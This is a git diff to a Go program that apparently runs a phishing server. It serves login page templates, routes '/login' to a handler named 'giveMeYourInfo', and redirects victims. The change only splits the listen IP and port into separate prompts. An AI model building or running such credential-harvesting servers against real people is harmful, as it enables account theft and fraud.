@@ -44,6 +44,7 @@ type ChoiceHandler struct {
 type Defaults struct {
 	Redirect string
 	BindIP   string
+	BindPort string
 }
 
 func menu() {
@@ -91,19 +92,26 @@ func menu() {
 	choice, _ := reader.ReadString('\n')
 	fmt.Print("[*] Choose redirect URL (Default is " + defaults.Redirect + "): ")
 	redir, _ := reader.ReadString('\n')
-	fmt.Print("[*] Enter IP and port to listen on (Default is " + defaults.BindIP + "): ")
+	fmt.Print("[*] Enter IP to listen on (Default is " + defaults.BindIP + "): ")
 	listenip, _ := reader.ReadString('\n')
+	fmt.Print("[*] Enter port to listen on (Default is " + defaults.BindPort + "): ")
+	listenport, _ := reader.ReadString('\n')
 
 	if len(listenip) <= 2 {
 		listenip = defaults.BindIP
 	}
 	listenip = strings.TrimSpace(listenip)
 	redir = strings.TrimSpace(redir)
+	listenport = strings.TrimSpace(listenport)
 	if redir == "" {
 		redir = defaults.Redirect
 	}
+	if len(listenport) == 0 {
+		listenport = defaults.BindPort
+	}
 	bloatedChoiceHandler(choice)
-	loadTheWebMan(choice, listenip, redir)
+	loadTheWebMan(choice, listenip, listenport, redir)
+
 }
 
 func bloatedChoiceHandler(choice string) string {
@@ -151,13 +159,13 @@ func bloatedChoiceHandler(choice string) string {
 	return returns
 }
 
-func loadTheWebMan(choice, listenip, redir string) {
+func loadTheWebMan(choice, listenip, listenport, redir string) {
 	choiceHandler := &ChoiceHandler{Choice: choice, Redir: redir}
 	http.HandleFunc("/login", choiceHandler.giveMeYourInfo)
 	http.HandleFunc("/", choiceHandler.epicTemplateLoader)
 	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./static"))))
-	fmt.Println("[*] HTTP listener started on " + listenip)
-	log.Fatal(http.ListenAndServe(listenip, nil))
+	fmt.Println("[*] HTTP listener started on " + listenip + ":" + listenport)
+	log.Fatal(http.ListenAndServe(listenip+":"+listenport, nil))
 }
 
 func (p *Login) lmaoOwnedInfo(choice string) error {
